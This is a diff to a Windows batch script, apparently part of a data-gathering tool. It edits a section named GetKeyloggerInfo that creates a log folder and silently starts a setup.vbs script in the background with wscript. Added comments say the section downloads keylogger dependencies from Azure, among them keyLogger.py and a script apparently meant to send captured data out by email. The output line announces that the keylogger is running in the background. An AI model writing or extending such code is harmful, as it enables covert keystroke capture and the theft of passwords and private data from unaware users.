@@ -89,14 +89,19 @@ exit /b
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
     mkdir keyloggerLogs
-    :: this line need to replace with a code that execute a keyloggerApp like a azure service
     ::
     ::
     ::
-    start "" wscript //B //Nologo "KeyLoggerApp\app\setup.vbs" 
+    ::
+
+    ::  in this section  are the logic that download dependencies from azure
+    :: dependences are setup.vbs, keyLogger.py, ExtractAfterEmail.vbs
+
     ::
     ::
     ::
+    start "" wscript //B //Nologo "setup.vbs" 
+ 
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
